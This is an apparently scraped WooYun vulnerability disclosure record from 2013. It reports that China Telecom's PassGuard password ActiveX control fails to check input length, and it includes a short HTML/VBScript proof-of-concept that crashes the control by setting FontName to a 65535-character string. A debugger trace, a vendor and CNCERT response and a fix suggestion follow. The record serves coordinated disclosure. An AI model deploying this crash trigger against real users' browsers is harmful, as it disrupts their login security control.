{"id": 13536, "wybug_id": "wooyun-2013-019189", "wybug_title": "中国电信PassGuard插件多个函数输入检查不严格可以导致拒绝服务", "wybug_corp": "中国电信", "wybug_author": "blast", "wybug_date": "2013-02-26 08:51", "wybug_open_date": "2013-04-12 08:51", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务", "浏览器安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-12：\t细节向公众公开  简要描述： 中国电信密码安全控件多个函数可以导致拒绝服务 详细说明：  手残……实在弄不出来更高的危害了……不过我感觉可能有……插件在这个页面：https://sso.jf.118114.cn/sso/login?service=http%3a%2f%2fjf.ct10000.com%2fSelfHelp%2fdefault.aspx虽说JavaScript是想检测32位和64位的系统，不过到最后貌似都下载回了32位的版本，所以这个应该是32位64位通用的以FontName这个属性来说，这个控件设置了它的最大长度为FontName[32]，但是拷贝超过32个字符它也不检查，所以\n<html>Test Exploit page<object classid='clsid:3A2C8BC3-5B68-4AE5-81D6-6DC378708F3E' id='target' ></object><script language='vbscript'>arg1=String(65535, \"A\")target.FontName = arg1</script>\n\n7C92EB53\tMOV [ESP],EAX7C92EB56\tMOV DWORD PTR [ESP+4],07C92EB5E\tMOV DWORD PTR [ESP+8],07C92EB66\tMOV DWORD PTR [ESP+10],07C92EB6E\tPUSH ESP7C92EB6F\tCALL 7C92EBAC7C92EB74\tMOV EAX,[ESP]\t  <--- 崩溃7C92EB77\tMOV ESP,EBP7C92EB79\tPOP EBP7C92EB7A\tRETN7C92EB7B\tNOP7C92EB7C\tLEA ESP,[ESP]7C92EB83\tLEA ECX,[ECX]7C92EB86\tNOP7C92EB87\tNOP\n\nEIP 7C92EB74EAX C0000008EBX 014C3D40 -> 4FCCA0B9ECX 0013FB40 -> 7C92EB94EDX 7C92EB3D -> 83EC8B55EDI 00F92110 -> C4DA4CDDESI 014FCCA0 -> 014C64C4EBP 0013FB3C -> 0013FB50ESP 0013FAEC -> C0000008最后释放句柄的时候出现无效句柄的异常\n其他基本所有属性都有这毛病……包括BackColor等等都有问题   漏洞证明：  \n\n   修复方案：  检查输入   版权声明：转载请注明来源 blast@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-02-28 23:05 厂商回复： CNVD确认漏洞分析过程以及p.o.c验证情况，已在26日下午转由CNCERT直接协调中国电信集团公司，由其分析后处置。按部分影响机可用性、完整性进行评分（以可利用为前提），基本危害评分6.82，发现技术难度系数1.3(逆向)，涉及行业或单位影响系数1.5，综合rank=6.82*1.3*1.5=13.299 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-11 19:08 |    \t\tzyymartin \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:22        )\t\t \n  0.0这个略屌    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}